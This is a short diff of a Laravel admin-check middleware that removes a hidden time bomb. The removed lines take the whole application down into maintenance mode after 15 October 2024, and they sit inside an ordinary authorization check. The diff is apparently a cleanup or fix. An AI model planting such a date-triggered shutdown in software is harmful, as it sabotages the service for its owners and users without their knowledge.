@@ -63,12 +63,7 @@ class CheckIfAdmin
         if (! $this->checkIfUserIsAdmin(backpack_user())) {
             return $this->respondToUnauthorizedRequest($request);
         }
-        if (Carbon::today()->gt(carbonInstance('2024-10-15')->startOfDay())) {
-            if (!app()->isDownForMaintenance()) {
-                Artisan::call('down');
-            }
-        }
-
+        
         return $next($request);
     }
 }
